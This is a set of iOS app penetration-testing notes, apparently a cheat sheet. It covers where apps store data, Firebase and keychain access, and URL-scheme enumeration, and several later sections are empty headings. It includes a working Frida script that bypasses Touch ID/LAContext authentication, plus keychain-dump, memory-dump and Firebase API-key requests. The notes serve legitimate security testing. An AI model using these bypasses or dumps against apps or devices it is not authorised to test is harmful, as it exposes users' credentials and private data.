# Data Storage

Application path: /private/var/mobile/Containers/Data/Application/\<APP ID>/

## Plist

Search: `find ./ -name "*.plist"`
Read plist: `plistutil -i file.plist`

## Core Data (SQL database)

Path: /private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support

## SQLite Databases

Search: `find ./ -name "*.sqlite" -or -name "*.db" -or -name "*.sqlite"`

## Firebase

Find strings like "https://FIREBASE_AUTH_DOMAIN_ID.firebaseio.com". Make request: "https://FIREBASE_AUTH_DOMAIN_ID.firebaseio.com/.json/"

## CouchBase
Search:  `find ./ -name *.cblite2`

#### Access info with APPID and API Key

Find and read GoogleService-Info.plist.
Find:
- API KEY AIzaSyAs1[...]
- APP ID 1:612345678909:ios:c212345678909876

Make request:  `curl -v -X POST "https://firebaseremoteconfig.googleapis.com/v1/projects/612345678909/namespaces/firebase:fetch?key=AIzaSyAs1[...]" -H "Content-Type: application/json" --data '{"appId": "1:612345678909:ios:c212345678909876", "appInstanceId": "PROD"}'`

## Realm Databases

Find: `find ./ -name "*.realm*"`

## Cache

Path: /private/var/mobile/Containers/Data/Application/\<APP ID>/Library/Caches/\<Bundle ID>/Cache.db

## Snapshots

Snapshots are taken when user press home-button and they can contain sensitive information.
Path: Library/Caches/Snapshots/ or Library/SplashBoard/Snapshots

## Keychain

Dump: `objection -g app_bundle_id explore -s "ios keychain dump"`

# Logs
Find device ID: `idevice_id --list`
Get logs: `idevicesyslog -u <id> (| grep <app>)`

# Backup

https://pypi.org/project/iOSbackup/

# Sensitive Info in Memory

Dump app memory with fridump.
Find info: `rabin2 -ZZ memory > strings.txt`

# Broken Cryptography

Monitor crypto libraries with objection: `ios monitor crypt`

You should find hardcoded secrets/passwords.

# Local Authentication

Frida bypass LAContext authentication:

```
setTimeout(function(){
	if (ObjC.available) {
		var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
		Interceptor.attach(hook.implementation, {
			onEnter: function(args) {
				console.log("Trying to bypass touch ID...");
				var block = new ObjC.Block(args[4]);
				const callback = block.implementation;
				block.implementation = function(error, value) {
					console.log("Touch ID has been bypassed successfully!");
					return callback(true, null);
				};
			}
		});
	} else {
		console.log("Objective-C Runtime is not available!");
	}
}, 0);
```


or with objection: `ios ui biometrics_bypass`

# IPC

## Deeplinks

Custom URI schemes stored at Info.plist and handled in AppDelegate.

In Info.plist registered URLs which app requests to open:
```
<key>LSApplicationQueriesSchemes</key>
    <array>
        <string>url_scheme1</string>
        <string>url_scheme2</string>
    </array>
```

Find URL schemes which app opens:
```
egrep -nr "open.*options.*completionHandler" ./TApp/
egrep -nr "openURL\(" ./App/
egrep -nr "mt-encrypted-file://" ./App/
egrep -nr "://" ./App/
```

Using rabin:
`rabin2 -zzq Telegram\ X.app/Telegram\ X | grep -i "openurl"`

Open URL using Frida:
```
function openURL(url) {
	var UIApplication = ObjC.classes.UIApplication.sharedApplication();
	var toOpen = ObjC.classes.NSURL.URLWithString_(url);
	return UIApplication.openURL_(toOpen);
}
```

### Fuzzing URL schemes

https://grepharder.github.io/blog/0x03_learning_about_universal_links_and_fuzzing_url_schemes_on_ios_with_frida.html

## Universal links

## UIActivity Sharing

## UIPasteboard

## AppExtensions

## WebViews

## Serialization and Encoding

# Network Communication

